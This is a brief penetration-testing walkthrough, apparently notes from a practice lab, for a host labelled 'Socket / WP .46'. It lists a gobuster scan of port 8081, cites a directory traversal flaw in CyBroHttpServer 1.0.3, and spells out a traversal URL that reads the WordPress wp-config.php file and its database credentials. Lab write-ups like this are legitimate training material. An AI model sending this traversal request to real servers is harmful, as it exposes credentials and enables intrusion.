
Socket / WP .46

1.Gobuster the port 8081 to get the readme.txt and history.txt - ​gobuster -u http://192.168.XX.46:8081 -w /opt/SecLists/Discovery/Web-Content/common.txt  -x txt,php,asp,db 
2. CyBroHttpServer 1.0.3 is vulnerable to Directory Traversal - ​https://www.exploit-db.com/exploits/45303 
3. http://192.168.XX.46:8081/..\..\..\..\xampp\htdocs\blog\wp-config.php